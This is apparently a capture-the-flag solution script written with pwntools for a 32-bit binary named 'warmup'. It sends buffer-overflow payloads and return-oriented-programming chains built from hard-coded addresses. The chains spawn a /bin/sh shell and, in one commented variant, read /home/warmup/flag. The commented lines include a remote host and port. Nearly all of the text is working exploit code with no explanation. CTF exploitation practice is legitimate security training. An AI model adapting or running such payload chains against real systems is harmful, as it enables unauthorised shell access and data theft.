from pwn import *
import sys

#elf = ELF("./warmup")
#rop = ROP(elf)
#print rop.find_gadget("ret")
"""
p = process("./warmup")
#p = remote("202.120.7.207", 52608)
log.info(p.recvuntil("2016!"))
p.send("a"*32 + p32(0x080480D8) + "\x00"*16)
log.info(p.recvuntil("2016!"))
#p.interactive()
p.send("\x00"*32 + p32(0x0804811D) + p32(0x08048122) + p32(0) + p32(0x080491D3) + p32(0x080491DB))
log.info(p.recvuntil("Luck!"))
p.send("/bin/sh\x00\x00\x00\x00")
p.interactive()
"""
#sys.stdout.write ("a"*32 + p32(0x0804811D) + p32(0x0804815A) + p32(0) + p32(0x080491D3) + p32(48) + "/bin/cat" + p32(0) + "/home/warmup/flag\x00\x00\x00" +p32(0) + p32(0x080491D3) + p32(0x80491Df) + p32(0) + "b"*32 + p32(0x0804811D) + p32(0x0804813A) + p32(0) + p32(0x080491D3) + p32(0x080491f7) + "/bin/cat\x00\x00\x00")
sys.stdout.write ("a"*32 + p32(0x0804811D) + p32(0x0804815A) + p32(0) + p32(0x080491D3) + p32(1000) + "\x00"*4 + "\x00"*32 + p32(0x0804811D) + p32(0x080480D8) + p32(0) + p32(0x080491D3) + p32(0x080491DB) + "/bin/sh\x00\x00\x00\x00" + "a"*32 + p32(0x0804811D) + p32(0x08048122) + p32(0) + p32(0x080491f0) + p32(0x080491DB) + "/bin/sh\x00\x00\x00\x00")




